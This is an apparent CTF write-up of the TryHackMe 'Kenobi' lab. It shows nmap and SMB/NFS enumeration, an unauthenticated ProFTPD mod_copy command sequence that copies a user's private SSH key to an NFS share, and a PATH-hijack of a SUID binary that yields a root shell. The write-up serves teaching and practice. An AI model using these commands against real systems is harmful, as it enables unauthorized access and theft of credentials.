# TryHackMe: Kenobi

**Difficulty:** Easy
**Category:** Linux exploitation, service misconfiguration, privilege escalation

## Overview

Kenobi is a Linux boot2root machine that chains together several classic misconfigurations: an exposed NFS share, a vulnerable ProFTPD install, and a SUID binary vulnerable to PATH hijacking. It's a good next step after basic web/upload rooms since it focuses on service enumeration and Linux privilege escalation instead.

## Recon

Started with a full port scan to see everything the box was running:

```
nmap -sC -sV -p- [target-ip]
```

Open ports of interest:

| Port | Service |
|---|---|
| 21 | FTP (ProFTPD 1.3.5) |
| 22 | SSH |
| 80 | HTTP |
| 111 | rpcbind |
| 139/445 | Samba (SMB) |
| 2049 | NFS |

Port 111 being open is the giveaway that an NFS share is exposed somewhere, rpcbind is what tells clients where to find NFS.

## Enumeration

**NFS share discovery:**

```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount [target-ip]
```

This revealed an exported directory at `/var`, mountable without authentication.

**Samba enumeration:**

```
smbclient -L //[target-ip]/
smbclient //[target-ip]/anonymous
```

The `anonymous` share was accessible without credentials and contained a `log.txt` file. Filtering it for anything useful:

```
grep -Ei "ftp|proftpd|open" log.txt
```

This confirmed the box was running **ProFTPD 1.3.5** on port 21, and leaked details from when the `kenobi` user's SSH key was generated.

## Exploitation

ProFTPD 1.3.5 has a known vulnerability in its `mod_copy` module. Checked for a working exploit:

```
searchsploit ProFTPD 1.3.5
```

This turned up a mod_copy command execution exploit that lets you issue `CPFR`/`CPTO` (copy from/copy to) commands over FTP without authentication, effectively letting you copy files around the filesystem as the FTP service user.

The key move: since `/var` was already mounted via NFS and world-writable, I used the mod_copy bug to copy the `kenobi` user's private SSH key out of their home directory and into `/var/tmp`, a location covered by the NFS mount:

```
nc [target-ip] 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

Mounted the NFS share locally, pulled the key off it, fixed permissions, and used it to SSH in directly as `kenobi`:

```
mount -t nfs [target-ip]:/var /mnt/kenobiNFS
cp /mnt/kenobiNFS/tmp/id_rsa .
chmod 600 id_rsa
ssh -i id_rsa kenobi@[target-ip]
```

Grabbed the user flag from `/home/kenobi/user.txt`.

## Privilege Escalation

Searched for SUID binaries on the box:

```
find / -perm -u=s -type f 2>/dev/null
```

An unusual entry stood out: `/usr/bin/menu`, not a standard system binary. Running `strings` on it showed it calls several system commands, including `ifconfig`, **without specifying their full path**.

Because it calls `ifconfig` by name rather than `/sbin/ifconfig`, it trusts whatever's first in the current `$PATH`. That's a classic PATH hijacking setup: I could drop a malicious script named `ifconfig` somewhere, put that directory first in `$PATH`, and the SUID binary would run my script instead, with root privileges, since `/usr/bin/menu` runs as root via SUID.

```
echo '/bin/bash' > /tmp/ifconfig
chmod 777 /tmp/ifconfig
export PATH=/tmp:$PATH
/usr/bin/menu
```

Selecting the `ifconfig` option in the menu executed the malicious script instead of the real binary, dropping straight into a root shell.

## Lessons Learned

- **rpcbind (111) open is a signal, not just noise.** Always worth checking for an NFS export whenever it shows up in a scan.
- **Old service versions are worth checking against searchsploit immediately.** ProFTPD 1.3.5 had a known, unauthenticated remote code execution path via mod_copy, no credentials needed at all.
- **NFS mounts and FTP file-copy bugs can be chained.** Individually, an open NFS share and a copy-primitive FTP bug both look fairly low severity, together they let you exfiltrate a private SSH key with zero authentication.
- **SUID binaries that call other programs without absolute paths are a real, common misconfiguration.** Always check `strings` output on unusual SUID binaries and think about what's actually in `$PATH` when they run.
